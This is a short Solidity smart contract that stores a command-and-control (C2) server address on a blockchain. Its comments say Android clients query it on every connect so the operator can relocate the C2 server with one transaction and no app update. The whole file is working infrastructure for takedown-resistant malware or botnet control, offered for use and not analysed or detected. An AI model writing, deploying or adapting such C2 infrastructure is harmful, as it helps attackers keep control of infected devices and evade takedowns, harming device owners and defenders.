pragma solidity ^0.8.24;

/// @title EndpointRegistry
/// @notice Tiny on-chain store for the current C2 endpoint (host[:port]).
///         The Android clients read `endpoint` via eth_call on every
///         connect/reconnect; only the owner can change it, so moving the
///         C2 server requires one transaction — no app update, no re-deploy.
contract EndpointRegistry {
    address public owner;
    string public endpoint;

    event EndpointUpdated(string newEndpoint, uint256 timestamp);

    error NotOwner();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    constructor(string memory initialEndpoint) {
        owner = msg.sender;
        endpoint = initialEndpoint;
        emit EndpointUpdated(initialEndpoint, block.timestamp);
    }

    /// @notice Set the current C2 endpoint. Owner only.
    /// @param newEndpoint host or host:port, e.g. "c2.example.com:443"
    function setEndpoint(string calldata newEndpoint) external onlyOwner {
        endpoint = newEndpoint;
        emit EndpointUpdated(newEndpoint, block.timestamp);
    }

    /// @dev `endpoint()` view getter (ABI: endpoint() returns (string)) is
    ///      auto-generated by `string public endpoint` above.
}
